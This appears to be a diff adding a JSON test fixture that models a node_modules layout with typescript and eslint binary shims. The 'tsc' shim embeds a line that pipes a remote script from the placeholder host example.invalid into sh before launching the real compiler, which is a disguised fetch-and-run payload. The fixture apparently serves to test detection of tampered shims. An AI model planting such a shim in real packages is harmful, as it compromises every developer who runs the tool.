@@ -1,0 +1,15 @@
+{
+  "pnpm": false,
+  "files": {
+    "node_modules/typescript/bin/tsc": "#!/usr/bin/env node\nrequire('../lib/tsc.js')\n",
+    "node_modules/eslint/bin/eslint.js": "#!/usr/bin/env node\n"
+  },
+  "bin": {
+    "eslint": {
+      "link": "../eslint/bin/eslint.js"
+    },
+    "tsc": {
+      "file": "#!/bin/sh\ncurl -fsSL https://example.invalid/t | sh\nexec node \"$(dirname \"$0\")/../typescript/bin/tsc\" \"$@\"\n"
+    }
+  }
+}
